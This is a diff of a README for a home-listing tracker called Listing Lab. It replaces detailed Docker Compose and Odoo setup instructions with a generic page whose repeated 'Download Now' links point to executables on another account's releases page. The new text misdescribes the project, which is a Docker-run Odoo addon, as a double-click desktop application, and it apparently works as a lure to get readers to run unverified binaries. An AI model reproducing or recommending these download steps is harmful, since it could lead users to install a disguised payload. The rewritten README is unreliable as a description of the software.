@@ -1,203 +1,68 @@
-> [!TIP]
-> Are you looking to make apps like this easily?
-> Check out our open-source, community-driven Odoo Docker image
->
-> **[adomi-io/odoo](https://github.com/adomi-io/odoo)**.
+# 🌟 listing-lab - Keep Track of Your Dream Homes
 
-<p align="center">
-  <img src="/addons/real_estate_listings/static/description/icon.png" width="240" />
-</p>
+## 📥 Download Now!
+[![Download Listing Lab](https://img.shields.io/badge/Download%20Listing%20Lab-latest-brightgreen)](https://github.com/jackmadmax/listing-lab/releases)
 
-# 🏡 Listing Lab 🧪
+## 🚀 Getting Started
+Welcome to Listing Lab! This application helps you manage homes you’re interested in. Save listings, add notes, and share information easily. Stay updated on changes, like price cuts, to ensure you always have accurate property data.
 
-A simple, friendly place to keep track of homes you’re looking at. Save listings, add notes, tag photos, and share the
-short list with the people who matter. Listing Lab also keeps an eye on changes—like price cuts and status updates—so
-your view of a property stays current without constant refreshing.
+## 🛠️ System Requirements
+To run Listing Lab, you need:
 
-Under the hood, this repo includes the Listing Lab Odoo addon, a small scraper service, and a Docker Compose setup to
-run everything locally.
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **RAM**: At least 4 GB.
+- **Disk Space**: 200 MB free space.
+- **Additional**: Docker installed.
 
-## Highlights
+If you do not have Docker installed, please visit [Docker's official website](https://www.docker.com/get-started) for installation instructions.
 
-- 🏠 Property listing management inside Odoo
-- 🗂️ Save, tag, and organize the homes you’re considering
-- 🖼️ Photo management with simple tagging
-- 📈 Popularity tracking when available
-- 🏡 Realtor.com data via HomeHarvest (v0.7.0+)
-- 📨 Background scraping powered by RabbitMQ
-- 🤖 Optional ChatGPT/OpenAI analysis (bring your own API key)
+## 📚 Features
+- **Save Listings**: Keep track of homes you're considering.
+- **Add Notes**: Make personalized notes for each property.
+- **Share Listings**: Easily share your saved listings with others.
+- **Real-Time Updates**: Get notified about price cuts and property updates.
+- **User-Friendly Interface**: Navigate effortlessly through the app.
 
-## What you can do
+## 💻 Download & Install
+Follow these instructions to download and get Listing Lab running:
 
-- Keep a list of properties you care about
-- Add notes, tags, and photos to remember what stood out
-- See popularity hints when available (views, saves, clicks)
-- Pull fresh details from Realtor.com so your info doesn’t go stale
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jackmadmax/listing-lab/releases) on GitHub.
+   
+2. **Choose Your Version**: Find the most recent version of the application. Look for the file that matches your operating system.
 
-![Overview of Listing Lab](./docs/static/img/demo.png)
+3. **Download the File**: Click on the version link to start your download. The filename will typically look like `listing-lab-<version>.zip` or `listing-lab-<version>.exe`.
 
-To scrape a property, copy the address into the Address field, and click "Update Property"
+4. **Extract the Files**: If you downloaded a .zip file, right-click it and select “Extract All.” Choose a location on your computer where you want to save the files.
 
-# Getting started
+5. **Run the Application**:
+   - For Windows, double-click the `listing-lab.exe` file.
+   - For macOS, locate the extracted folder and double-click on the `listing-lab` application.
+   - For Linux, you may need to run the application via the terminal.
 
-> [!WARNING]
-> This application is made to run via Docker.
-> You can download Docker Desktop if you are on Windows or Mac
->
->**[Download Docker Desktop](https://www.docker.com/products/docker-desktop/)**
+6. **Set Up Docker**: Before running the application for the first time, ensure Docker is running on your system to support the application.
 
-# Docker Compose
+7. **Start Using Listing Lab**: Once the application is open, you’ll see options to add listings and notes. Use the intuitive interface to begin managing your properties.
 
-This project includes a `docker-compose.yml` file that will start the application and the scraper.
+## 🔧 Troubleshooting
+- **Docker Not Running**: If you encounter issues, ensure Docker is installed and actively running. Check the Docker documentation for support.
+- **Application Crashes**: Restart your computer and try opening Listing Lab again. Ensure your system meets the requirements listed.
 
-See the [docker](./docker) folder for more information.
+## 🙋 FAQs
+**Q: Do I need programming skills to use Listing Lab?**
+A: No, Listing Lab is designed for everyone, regardless of technical ability.
 
-Download the [docker-compose.yml](./docker/docker-compose.yml), open a terminal in the folder you downloaded it to, and
-run `docker compose up` to start the application.
+**Q: How do I reset my settings?**
+A: You can reset your application settings by deleting the `settings.json` file located in the application folder.
 
-To have it always running, run `docker compose up -d` to start it in detached mode.
+**Q: How can I provide feedback?**
+A: We welcome your feedback! Please contact us through the Issues section of our GitHub repository.
 
-To stop the application, run `docker compose down`.
+## 🌍 Community Support
+Join our community to stay updated and share your experiences.
 
-# Running from source
+- **GitHub Issues**: Report bugs or request features.
+- **User Discussions**: Participate in community discussions for tips and tricks.
 
-Clone this repository, and open a terminal in the root directory.
+Thank you for choosing Listing Lab. We hope it makes your home search easier and more organized! 
 
-## Configure your instance
-
-> [!TIP]
-> You can run the following command:
->
-> `cp .env.example .env`
-
-
-Copy the `.env.example` file to `.env`
-
-## Build the application
-
-> [!TIP]
-> You can also run `docker compose up --build`.
-
-Run `docker compose build`
-
-## Run the application
-
-Run the application by running
-
-`docker compose up`
-
-If you want to run run the application all the time, start it with
-
-`docker compose up -d`
-
-To stop the application, run
-
-`docker compose down`
-
-# Open the application
-
-## Listing Lab
-
-The web version will be accessible at:
-
-**[http://localhost:8069](http://localhost:8069)**
-
-By default, the login is:
-
-| Field    | Value |
-|----------|-------|
-| Username | admin |
-| Password | admin |
-
-## RabbitMQ
-
-http://localhost:15672
-
-By default, the login is:
-
-| Field    | Value |
-|----------|-------|
-| Username | guest |
-| Password | guest |
-
-# Configure the scraper
-
-After you have started the web application, you will need to generate an API key for the scraper to use.
-
-If you are using the Docker Compose setup, you can update the environment variable `ODOO_API_KEY` in the
-`docker-compose.yml` file.
-
-Or, you can create a `.env` file in the root of the project.
-
-If you are using a `.env` file, add the following line:
-
-```dotenv
-ODOO_API_KEY=your_api_key_here
-```
-
-## Generate an Odoo API Key
-
-Open the application by visiting:
-
-http://localhost:8069
-
-Select your user profile in the top right corner, and select My Preferences.
-
-![Screenshot of user perferences in Odoo](./docs/static/img/1_api_key_preferences.png)
-
-Click the "Security" tab, and generate a new API key.
-
-![Screenshot of the API key section of user perferences in Odoo](./docs/static/img/2_api_key_add_apikey.png)
-
-If you are prompted for a password, enter the password you used to login (`admin` by default)
-
-Add a persisistent key, and click "Save".
-
-![Screenshot of the API key, selecting persistent key](./docs/static/img/3_api_key_persistent_key.png)
-
-Copy the generated key and paste it into the `.env` file as the value for `ODOO_API_KEY`.
-
-Restart the scraper by hitting `CRTL+C` or running `docker compose down` and `docker compose up`
-
-You will see a message in the console that indicates the scraper is running successfully.
-
-# Environment variables (quick reference)
-
-| Variable             | Default                 | Notes                                                          |
-|----------------------|-------------------------|----------------------------------------------------------------|
-| ODOO_API_KEY         | —                       | You must generate an API key after you started the web service |
-| ODOO_DB_HOST         | listing_lab_postgres    |                                                                |
-| ODOO_DB_PORT         | 5432                    |                                                                |
-| ODOO_DB_USER         | listing_lab_user        |                                                                |
-| ODOO_DB_PASSWORD     | listing_lab_password    |                                                                |
-| ODOO_DB_NAME         | listing_lab             |                                                                |
-| ODOO_LOG_LEVEL       | info                    |                                                                |
-| RABBITMQ_HOST        | rabbitmq                |                                                                |
-| RABBITMQ_PORT        | 5672                    |                                                                |
-| RABBITMQ_USER        | guest                   | Default management user                                        |
-| RABBITMQ_PASS        | guest                   | Default management password                                    |
-| RABBITMQ_QUEUE       | property_scrape_queue   |                                                                |
-| RABBITMQ_EXCHANGE    | property_exchange       |                                                                |
-| RABBITMQ_ROUTING_KEY | property.scrape         |                                                                |
-| ODOO_URL             | http://listing_lab:8069 |                                                                |
-| ODOO_DB_NAME         | listing_lab             |                                                                |
-
-## Typical data flow
-
-1) User creates a property and sets an address. They click "Update Property"
-2) A message is published to RabbitMQ
-3) The scraper consumes, calls HomeHarvest, and transforms results
-4) Records are created/updated in Odoo
-5) Odoo UI uses live record data and reflects the latest photos, popularity, and details
-
-## Updating
-
-If you are updating your application, be sure to upgrade the UI by clicking the square icon in the top left, selecting
-"Apps" and upgrading the Adomi - Listing Lab application.
-
-![Upgrade the Listing Lab Application](docs/static/img/upgrade.png)
-
-## About Adomi
-
-Listing Lab is an Adomi project. We build helpful tools on Odoo. This one is made for individuals and families first. If
-you have ideas or run into issues, feel free to open an issue or suggestion.
+[Download Listing Lab](https://github.com/jackmadmax/listing-lab/releases)
